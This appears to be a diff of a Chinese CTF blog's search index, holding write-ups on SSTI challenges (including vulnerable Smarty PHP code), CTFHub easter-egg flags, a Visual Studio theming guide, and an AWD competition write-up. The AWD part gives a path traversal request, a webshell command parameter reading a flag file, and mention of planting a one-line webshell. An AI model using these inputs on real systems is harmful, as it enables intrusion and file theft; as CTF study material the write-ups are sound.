@@ -225,6 +225,122 @@ AddHandler cgi-script .cgi   <span aria-hidden="true" class="line-numbers-rows">
       </tags>
   </entry>
   <entry>
+    <title>SSTI模板注入</title>
+    <url>/2023/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><img src= "/img/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述"></p>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>ssti注入点在msg<br>注入49出现orz应该是有过滤</p>
+1正常
+<p>hint里缺cookie_secret<br>该项在handler.settings</p>
+<blockquote>
+<p>Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象<br>RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性<br>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</p>
+</blockquote>
+<p><img src= "/img/ac2991bc7e1e4e64b87451461cb17916.png" alt="在这里插入图片描述">然后按hint里的MD5加密过后传参<br><img src= "/img/3ee21ded82d8493baba4f8b5b940927a.png" alt="在这里插入图片描述"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span><span class="token assign-left variable">filehash</span><span class="token operator">=</span>ff92d5623223cadc00efabfc7676f9fe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>filehash不同 请自行加密<br><img src= "/img/c860336ae81a4d6e8c52328bf1ae378c.png" alt="在这里插入图片描述"></p>
+<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p><img src= "/img/ec82c70c7fdf49b698f9095bda0d1662.png" alt="在这里插入图片描述"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'header.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./libs/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+	<span class="token punctuation">&#123;</span>
+		   <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+	    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span>
+	<span class="token punctuation">&#123;</span>
+	    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">//$your_ip = $smarty->display("string:".$ip);</span>
+	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div class=\"container panel1\">
+				&lt;div class=\"row\">
+				&lt;div class=\"col-md-4\">	
+				&lt;/div>
+				&lt;div class=\"col-md-4\">
+				&lt;div class=\"jumbotron pan\">
+					&lt;div class=\"form-group log\">
+						&lt;label>&lt;h2>Your IP is : "</span><span class="token punctuation">;</span>
+	<span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"string:"</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"				&lt;/h2>&lt;/label>
+					&lt;/div>		
+				&lt;/div>
+				&lt;/div>
+				&lt;div class=\"col-md-4\">	
+				&lt;/div>
+				&lt;/div>
+			&lt;/div>"</span><span class="token punctuation">;</span>
+	<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src= "/img/eb0e52d7b7f74ac1bb74f7c38b4ca72f.png" alt="在这里插入图片描述"></p>
+<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p><img src= "/img/f568432cbffb4e5f9603858a0cfa797d.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>SSTI</tag>
+        <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-彩蛋</title>
+    <url>/2023/07/CTFHub%E5%BD%A9%E8%9B%8B/</url>
+    <content><![CDATA[<h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述">这样设置参数<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述">在最后一行</p>
+<h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述"></p>
+<h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post最后一行介绍</p>
+<h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
+<blockquote>
+<p>彩蛋	关键词	egg	ctfhub	CTFHub	拿来把你	CTFer 自己人 ……</p>
+</blockquote>
+<p>到底没想到竟然是flag</p>
+<h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">ctfhub</span><span class="token punctuation">&#123;</span>029e02eb3a1
+	e8c49b1132b5
+	15b652a5f3a8
+	62013<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
+<h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2023/07/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
+<p> 我之前用的是2019版本，后来有出新版我也没管，直到前几天他给我推送2022版了，查了下大部分都是好评（bug恐惧症和恋旧），于是我决定入2022版了，但又怕我在2019调好的设置用不到2022上，于是暂时让两个版本共存，等2022调试好了再说2019的事。</p>
+<p>这是我在2019上美化用到的插件和设置（因为网上类似的不少，但2022版貌似没有人发过，所以我决定写这篇文章）</p>
+<p>不出所料，2022版好多东西更新，导致一些东西不能用了，导入2019版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
+<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
+<p>第一个插件，是2019版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
+<p>新建项目 C#里面最后一项</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
+<p> 创建之后，把2019版的该插件里的美化设置导出，然后重命名为CustomTheme.vstheme</p>
+<p>然后复制到你新创建的2022版那个项目里，选择替换更新，之后项目文件夹里.sln后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启visualstudio就可以了</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
+<p>这个插件是为后面设置背景图片准备</p>
+<p>第二个插件我原来用的是moeIDE，但是2022版它不支持了，所以就用新插件代替了。</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
+<p>背景图是B站1024节发布的一张壁纸，我用ps调了下对比度，让他更鲜艳一些</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
+]]></content>
+      <categories>
+        <category>资源</category>
+      </categories>
+      <tags>
+        <tag>visual studio 2022</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PyJail python沙箱逃逸探究</title>
     <url>/2023/07/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
     <content><![CDATA[<h1 id="python-特性"><a href="#python-特性" class="headerlink" title="python 特性"></a>python 特性</h1><p>在python中，类均继承自<code>object</code>基类；</p>
@@ -294,119 +410,41 @@ AddHandler cgi-script .cgi   <span aria-hidden="true" class="line-numbers-rows">
       </tags>
   </entry>
   <entry>
-    <title>ctfhub-彩蛋</title>
-    <url>/2023/07/CTFHub%E5%BD%A9%E8%9B%8B/</url>
-    <content><![CDATA[<h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述">这样设置参数<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述">在最后一行</p>
-<h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述"></p>
-<h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post最后一行介绍</p>
-<h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
-<blockquote>
-<p>彩蛋	关键词	egg	ctfhub	CTFHub	拿来把你	CTFer 自己人 ……</p>
-</blockquote>
-<p>到底没想到竟然是flag</p>
-<h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">ctfhub</span><span class="token punctuation">&#123;</span>029e02eb3a1
-	e8c49b1132b5
-	15b652a5f3a8
-	62013<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
-<h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>
+    <title>2024长城杯铁人三项半决赛第二赛区wp</title>
+    <url>/2024/05/awdwp/</url>
+    <content><![CDATA[<h1 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>备份文件泄露</p>
+<p>下载后是流量包</p>
+<p>流量包存在明文 flag</p>
+<p>（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）</p>
+<p><img src= "/./img/image-20240421174259759.png" alt="image-20240421174259759"></p>
+<h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>流量里还有一个 flag.zip</p>
+<p>导出后</p>
+<p>爆破得密码为 123456</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>存在 rce 查看解析目录后 echo 一句话木马进去</p>
+<p>连接后 cat &#x2F;flag 啥啥啥.txt</p>
+<p>flag get</p>
+<p><img src= "/./img/image-20240421175236.png" alt="屏幕截图 2024-04-21 175236"></p>
+<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><p>题目附件备份：</p>
+<p><a href="./files/web.tar">php</a></p>
+<p><a href="./files/jsp.tar">java1</a></p>
+<p><a href="./files/java.tar">java2</a></p>
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>hook 流量发现一个 php 路径穿越</p>
+<p><code>/frontend/ajax/getfile?file=../../../../../../flag.txt</code></p>
+<p>修复：</p>
+<p>将&#x2F;和.等用于路径穿越的字符过滤置空</p>
+<p><img src= "/./img/image-20240421182144415.png" alt="image-20240421182144415"></p>
+<h2 id="java1"><a href="#java1" class="headerlink" title="java1"></a>java1</h2><p>一个 java</p>
+<p><code>/forget.jsp?cmd1=cat+/flag.txt</code></p>
+<p>修复 把 cmd1 字段改成复杂密码 使攻击者无法连接</p>
+<p><img src= "/./img/image-20240421182841159.png" alt="image-20240421182841159"></p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>awd</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI模板注入</title>
-    <url>/2023/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p><img src= "/img/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述"></p>
-<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>ssti注入点在msg<br>注入49出现orz应该是有过滤</p>
-1正常
-<p>hint里缺cookie_secret<br>该项在handler.settings</p>
-<blockquote>
-<p>Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象<br>RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性<br>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</p>
-</blockquote>
-<p><img src= "/img/ac2991bc7e1e4e64b87451461cb17916.png" alt="在这里插入图片描述">然后按hint里的MD5加密过后传参<br><img src= "/img/3ee21ded82d8493baba4f8b5b940927a.png" alt="在这里插入图片描述"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span><span class="token assign-left variable">filehash</span><span class="token operator">=</span>ff92d5623223cadc00efabfc7676f9fe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>filehash不同 请自行加密<br><img src= "/img/c860336ae81a4d6e8c52328bf1ae378c.png" alt="在这里插入图片描述"></p>
-<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p><img src= "/img/ec82c70c7fdf49b698f9095bda0d1662.png" alt="在这里插入图片描述"></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'header.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./libs/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
-	<span class="token punctuation">&#123;</span>
-		   <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-	<span class="token punctuation">&#123;</span>
-	    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">else</span>
-	<span class="token punctuation">&#123;</span>
-	    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token comment">//$your_ip = $smarty->display("string:".$ip);</span>
-	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div class=\"container panel1\">
-				&lt;div class=\"row\">
-				&lt;div class=\"col-md-4\">	
-				&lt;/div>
-				&lt;div class=\"col-md-4\">
-				&lt;div class=\"jumbotron pan\">
-					&lt;div class=\"form-group log\">
-						&lt;label>&lt;h2>Your IP is : "</span><span class="token punctuation">;</span>
-	<span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"string:"</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"				&lt;/h2>&lt;/label>
-					&lt;/div>		
-				&lt;/div>
-				&lt;/div>
-				&lt;div class=\"col-md-4\">	
-				&lt;/div>
-				&lt;/div>
-			&lt;/div>"</span><span class="token punctuation">;</span>
-	<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src= "/img/eb0e52d7b7f74ac1bb74f7c38b4ca72f.png" alt="在这里插入图片描述"></p>
-<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p><img src= "/img/f568432cbffb4e5f9603858a0cfa797d.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>SSTI</tag>
-        <tag>模板注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2023/07/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
-<p> 我之前用的是2019版本，后来有出新版我也没管，直到前几天他给我推送2022版了，查了下大部分都是好评（bug恐惧症和恋旧），于是我决定入2022版了，但又怕我在2019调好的设置用不到2022上，于是暂时让两个版本共存，等2022调试好了再说2019的事。</p>
-<p>这是我在2019上美化用到的插件和设置（因为网上类似的不少，但2022版貌似没有人发过，所以我决定写这篇文章）</p>
-<p>不出所料，2022版好多东西更新，导致一些东西不能用了，导入2019版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
-<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
-<p>第一个插件，是2019版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
-<p>新建项目 C#里面最后一项</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
-<p> 创建之后，把2019版的该插件里的美化设置导出，然后重命名为CustomTheme.vstheme</p>
-<p>然后复制到你新创建的2022版那个项目里，选择替换更新，之后项目文件夹里.sln后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启visualstudio就可以了</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
-<p>这个插件是为后面设置背景图片准备</p>
-<p>第二个插件我原来用的是moeIDE，但是2022版它不支持了，所以就用新插件代替了。</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
-<p>背景图是B站1024节发布的一张壁纸，我用ps调了下对比度，让他更鲜艳一些</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
-]]></content>
-      <categories>
-        <category>资源</category>
-      </categories>
-      <tags>
-        <tag>visual studio 2022</tag>
+        <tag>awd</tag>
+        <tag>长城杯</tag>
+        <tag>铁人三项</tag>
       </tags>
   </entry>
   <entry>
@@ -636,38 +674,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
-    <title>git命令</title>
-    <url>/2023/07/git/</url>
-    <content><![CDATA[<h1 id="创建仓库命令"><a href="#创建仓库命令" class="headerlink" title="创建仓库命令"></a>创建仓库命令</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>git init 命令用于在目录中创建新的 Git 仓库。<br>在文件夹中，会被创建出一个.git的一个隐藏文件，这时，本地库已经初始化完成.</p>
-<h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><p>git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。<br>拷贝项目命令格式如下：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h1 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h1><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>git add 命令可将该文件添加到暂存区。</p>
-<p>添加一个或多个文件到暂存区</p>
